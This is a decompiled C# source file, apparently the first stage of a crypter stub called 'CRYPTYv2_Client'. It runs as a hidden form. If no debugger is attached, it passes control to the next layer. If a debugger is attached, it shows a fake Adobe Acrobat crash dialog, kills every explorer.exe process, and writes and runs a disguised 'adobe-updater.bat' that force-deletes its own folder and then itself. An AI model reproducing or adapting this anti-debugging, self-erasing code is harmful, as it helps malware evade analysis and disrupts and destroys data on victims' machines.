using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using CRYPTYv2_Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[DesignerGenerated]
public class layer1 : Form
{
	private IContainer components;

	public layer1()
	{
		((Form)this).add_Load((EventHandler)layer1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("L1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void layer1_Load(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		if (!Debugger.IsAttached)
		{
			((Control)MyProject.Forms.layer2).Show();
			((Control)this).Hide();
			return;
		}
		((Control)this).set_Visible(false);
		((Form)this).set_TopMost(true);
		object obj = "A problem caused the program to stop working correctly. Windows will close the program and notify you if a solution is available.";
		object obj2 = 16;
		object obj3 = "Adobe Acrobat";
		_ = (object)Interaction.MsgBox(RuntimeHelpers.GetObjectValue(obj), (MsgBoxStyle)Conversions.ToInteger(obj2), RuntimeHelpers.GetObjectValue(obj3));
		((Form)this).set_TopMost(false);
		Process[] processesByName = Process.GetProcessesByName("explorer");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!File.Exists(folderPath + "\\adobe-updater.bat"))
		{
			File.Create(folderPath + "\\adobe-updater.bat");
			StreamWriter streamWriter = new StreamWriter(folderPath + "\\adobe-updater.bat");
			streamWriter.Write("start rmdir /S /Q " + Application.get_StartupPath() + " && del /F " + folderPath + "\\adobe-updater.bat && taskkill /IM cmd.exe /F");
			streamWriter.Close();
			Interaction.Shell(folderPath + "\\adobe-updater.bat", (AppWinStyle)2, false, -1);
		}
		else
		{
			File.Delete(folderPath + "\\adobe-updater.bat");
		}
		Application.Exit();
	}
}
